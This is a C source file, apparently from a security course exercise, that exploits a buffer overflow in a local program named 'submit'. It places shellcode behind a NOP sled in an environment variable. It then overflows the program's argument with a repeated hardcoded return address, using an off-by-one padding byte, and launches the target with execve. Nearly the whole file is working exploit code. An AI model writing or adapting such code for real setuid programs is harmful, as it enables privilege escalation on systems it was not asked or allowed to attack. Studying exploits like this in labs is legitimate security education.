/*
 * dummy exploit program (Bufferoverflow, trick and fack off by one)
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"
#define TARGET "/usr/local/bin/submit"            //exploit target file 

int main( void )                                  //main program
{
  char shellCode[ 300 ];                          //where our shellcode hide 
  char *args[ 4 ];                                //command line arguments passed in to submit
  long *a;                                        //a pointer used to modify string
  char *env[ 1 ];                                 //environment char pointer array
  char nopsandaddress[ 1024 ];                    //buffer oveflow attack string
  int j;                                          //interator
  long *retaddr = ( long * ) 0xffbfdce0;          //this is the value we want to change ret address to
  int i = strlen( shellcode );                    //length of shellcode (55)
  //set up shellCode
  memset( shellCode, 0x90, 300 );                 //set nop

  a = shellCode + 245;                            //set a to 245th element in shellCode array 
  
  memcpy( a, shellcode, i );                      //copy shellcode in
  //set up overflow string
  memset( nopsandaddress, 0x90, 1 );              //Where this is exploting has a odd number chars infront, we need "off by one"
  
  a = nopsandaddress + 1;                         //move to next one
  
  for ( j = 0; j < 128; j+=1 ){                   //spam rest nopsandaddress array with return address
  		
  		*( a++ ) =  ( long )retaddr;                //note a++ has sidefact it will do assignment before increase
                                                  //I may be wrong
  }                                 
  
  args[ 0 ] = nopsandaddress;                     //set submit name as our string
  args[ 1 ] = NULL;
  args[ 2 ] = NULL; 
  args[ 3 ] = NULL;

  env[ 0 ] = shellCode;                           //set shellcode to env

  if ( execve( TARGET, args, env ) < 0 ){         //execv to submit
    fprintf( stderr, "execve failed.\n" );        //return err message if execv failed
  }

  exit(0);                                        //exit(0)
}
